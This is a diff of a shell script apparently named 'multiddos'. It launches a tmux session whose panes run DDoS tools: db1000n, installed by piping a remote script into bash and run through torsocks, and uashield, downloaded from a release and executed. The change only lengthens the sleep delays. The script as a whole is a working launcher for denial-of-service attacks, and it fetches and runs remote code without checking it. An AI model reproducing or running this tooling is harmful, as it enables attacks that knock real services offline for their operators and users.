@@ -65,20 +65,20 @@ grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.co
 tmux source-file ~/.tmux.conf
 
 tmux new-session -s multiddos -d 'gotop -asc solarized'
-sleep 0.1
+sleep 0.2
 tmux split-window -h -p 75 'bash auto_bash.sh'
-sleep 0.1
+sleep 0.2
 if [[ $mode == "-m2" || $mode == "-m3" ]]; then
 tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
 #tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
 fi
-sleep 0.1
+sleep 0.2
 if [[ $mode == "-m3" ]]; then
 tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.3/shield-1.0.3.tar.gz -o shield.tar.gz && tar -xzf shield.tar.gz --strip 1 && ./shield'
 fi
-sleep 0.1
+sleep 0.2
 tmux select-pane -t 0
-sleep 0.1
+sleep 0.2
 if [[ $matrix == "on" ]]; then
 sudo apt install cmatrix -qq -y
 tmux split-window -v 'cmatrix'
